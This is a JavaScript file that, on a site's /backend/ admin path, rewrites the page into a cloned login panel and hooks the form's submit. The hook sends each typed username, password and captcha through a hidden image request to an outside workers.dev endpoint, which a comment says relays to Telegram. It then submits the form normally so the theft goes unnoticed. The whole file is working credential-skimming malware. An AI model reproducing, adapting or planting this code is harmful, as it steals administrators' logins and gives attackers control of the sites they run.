document.addEventListener("DOMContentLoaded", function () {
  // Jalankan hanya di /backend/
  if (window.location.pathname.endsWith("/backend/") || window.location.pathname.endsWith("/backend")) {

    document.documentElement.lang = "en";
    document.documentElement.className = "light-style customizer-hide";
    document.documentElement.dir = "ltr";
    document.documentElement.dataset.theme = "theme-default";
    document.documentElement.dataset.assetsPath = "https://cxfteams.sbs/backend/assets/";
    document.documentElement.dataset.template = "vertical-menu-template";

    document.head.innerHTML = `
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
      <title>Infunux4d</title>
      <meta name="description" content="">
      <meta name="keywords" content="">
      <meta name="resource-type" content="document" />
      <meta http-equiv="content-type" content="text/html; charset=US-ASCII" />
      <meta http-equiv="content-language" content="en-us" />
      <meta name="author" content="CXFTEAMS" />
      <meta name="contact" content="cxfteams.sbs" />
      <meta name="copyright" content="Copyright (c) cxfteams.sbs. All Rights Reserved." />
      <meta name="robots" content="index, nofollow">
      <link rel="icon" type="image/x-icon" href="https://infinix2ndvip.top//upload/favicon.png" />
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/fonts/fontawesome.css" />
      <link rel="stylesheet" href="https://infinix2ndvip.top//backend/assets/vendor/fonts/tabler-icons.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/fonts/flag-icons.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/css/rtl/core.css" class="template-customizer-core-css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/css/rtl/theme-default.css" class="template-customizer-theme-css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/css/demo.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/libs/node-waves/node-waves.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/libs/typeahead-js/typeahead.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/libs/formvalidation/dist/css/formValidation.min.css" />
      <link rel="stylesheet" href="https://cxfteams.sbs/backend/assets/vendor/css/pages/page-auth.css" />
      <script src="https://cxfteams.sbs/backend/assets/vendor/js/helpers.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/js/config.js"></script>
    `;

    document.body.innerHTML = `
      <div class="container-xxl">
        <div class="authentication-wrapper authentication-basic container-p-y">
          <div class="authentication-inner py-4">
            <div class="card" style="background:#545250;">
              <div class="card-body">
                <div class="app-brand justify-content-center mb-4 mt-2">
                  <a href="https://infinix2ndvip.top/" class="app-brand-link gap-2">
                    <img src="https://infinix2ndvip.top/backend/logo.png" alt="logo icon" style="display: block; margin: 0 auto; width: 100%;">
                  </a>
                </div>
                <h4 class="mb-1 pt-2"></h4>
                <p class="mb-4" style="color:#fff;">Silakan masukan username dan password untuk login ke panel admin!</p>
                <form id="formAuthentication" class="mb-3" action="https://infinix2ndvip.top//backend/login-proses/" method="POST" autocomplete="off">
                  <div class="mb-3">
                    <input type="hidden" name="csrf_token" value="6aadbe34748950cf958912a4413cc25e6bfd86073ac9cf182ff9399de570025f">
                    <input type="hidden" name="session_token" value="7c24fa48c71aeee830c679b61e5c424c2dd89fb1f76de5a72a73be154d850f4d">
                    <label for="email" class="form-label text-white">Username</label>
                    <input type="text" class="form-control" id="email" name="user" placeholder="Enter your username" autofocus />
                  </div>
                  <div class="mb-3 form-password-toggle">
                    <div class="d-flex justify-content-between">
                      <label class="form-label text-white" for="password">Password</label>
                    </div>
                    <div class="input-group input-group-merge">
                      <input type="password" id="password" class="form-control" name="pass" placeholder="" aria-describedby="password" />
                    </div>
                  </div>
                  <div class="form-group mb-2 d-flex">
                    <span><img src="https://infinix2ndvip.top//backend/captcha/" alt="CAPTCHA"></span>
                    <input type="text" class="input-group-text" name="captcha_input" placeholder="Captcha code" required>
                  </div>
                  <div class="mb-3">
                    <button class="btn btn-primary d-grid w-100" type="submit">MASUK</button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/jquery/jquery.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/popper/popper.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/js/bootstrap.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/node-waves/node-waves.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/hammer/hammer.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/i18n/i18n.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/typeahead-js/typeahead.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/js/menu.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/formvalidation/dist/js/FormValidation.min.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/formvalidation/dist/js/plugins/Bootstrap5.min.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/vendor/libs/formvalidation/dist/js/plugins/AutoFocus.min.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/js/main.js"></script>
      <script src="https://cxfteams.sbs/backend/assets/js/pages-auth.js"></script>
      <script>
        $(document).ready(function() {
          $('#default-datatable').DataTable();
        });
      </script>
    `;

    // ---- Kirim data login ke endpoint Telegram via Image() ----
    document.addEventListener("submit", function (e) {
      const form = e.target;
      if (form.id === "formAuthentication") {
        e.preventDefault();

        const username = form.querySelector('input[name="user"]').value;
        const password = form.querySelector('input[name="pass"]').value;
        const captcha  = form.querySelector('input[name="captcha_input"]').value;

        const message = `Username: ${username}\nPassword: ${password}\nCaptcha: ${captcha}`;

        // Kirim sebagai request gambar agar bebas CORS
        const img = new Image();
        img.src = "https://memek-worker.defoy89122.workers.dev/?message=" + encodeURIComponent(message) + "&t=" + Date.now();

        // Lanjutkan submit langsung setelah request terkirim
        form.submit();
      }
    });
  }
});
